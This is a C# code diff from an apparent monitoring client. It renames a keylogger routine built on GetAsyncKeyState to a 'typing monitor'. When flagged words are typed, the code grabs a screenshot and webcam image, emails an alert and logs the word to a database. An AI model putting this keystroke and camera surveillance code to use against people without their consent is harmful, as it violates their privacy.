@@ -25,7 +25,7 @@ namespace ClientSide
                 stopThreadMonitor();
             }
             base.monitorAlive = true;
-            base.monitorThread = new Thread(playKeyLogger);
+            base.monitorThread = new Thread(playTypingMonitor);
             base.monitorThread.Start();
 
         }
@@ -37,14 +37,9 @@ namespace ClientSide
         // keylogger from API
         [DllImport("User32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
+    
 
-        public void playThread()
-        {
-            Thread keyLogger = new Thread(playKeyLogger);
-            keyLogger.Start();
-        }
-
-        public void playKeyLogger()
+        public void playTypingMonitor()
         {
             List<string> offensiveWords = base.SettingInstance.getWord();
             input = "";
@@ -94,9 +89,9 @@ namespace ClientSide
         {
             if (base.SettingInstance.triggersForAlert.Contains("badWord") == true)
             {
-                string FilePic = Picters.ScreenCapture();
-                Picters.CaptureCamera(FilePic);
-                Report.sendAlertToMail(FilePic, "badWord trigger occur", badWord, "typing");
+                string FilePic = ScreenCapture();
+                CaptureCamera(FilePic);
+                sendAlertToMail(FilePic, "badWord trigger occur", badWord, "typing");
                 ShowErrorDialog("send alert to mail\nTypedin trigger occur\nword: |" + badWord + "|");
 
             }
@@ -104,42 +99,12 @@ namespace ClientSide
             if (base.SettingInstance.triggersForReport.Contains("badWord") == true)
             {
                 base.DBInstance.connectToDatabase();
-                base.DBInstance.fillTable(1, DateTime.Now.ToString(), "\"" + badWord + "\"");
+                base.DBInstance.fillTriggersTable(1, DateTime.Now.ToString(), "\"" + badWord + "\"");
                 ShowErrorDialog("update DB\nTypedin trigger occur\nword: |" + badWord + "|");
             }
         }
 
-        public void inputEqualsSARA()
-        {
-
-
-            // sava keylogger in file
-            String filepath = Environment.CurrentDirectory;
-            if (!Directory.Exists(filepath))
-            {
-                Directory.CreateDirectory(filepath);
-            }
-
-            string path = (filepath + @"\AllAPP.txt");
-
-            if (!File.Exists(path))
-            {
-                using (StreamWriter sw = File.CreateText(path)) ;
-            }
-            string AllApp = ShowAllProcess.ListAllApplications();
-            using (StreamWriter sw = File.AppendText(path))
-            {
-                sw.Write(AllApp);
-
-            }
-            ShowErrorDialog(AllApp);//SARA 
-
-
-
-
-
-        }
-
+       
         private static void ShowErrorDialog(string message)
         {
             MessageBox.Show(message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
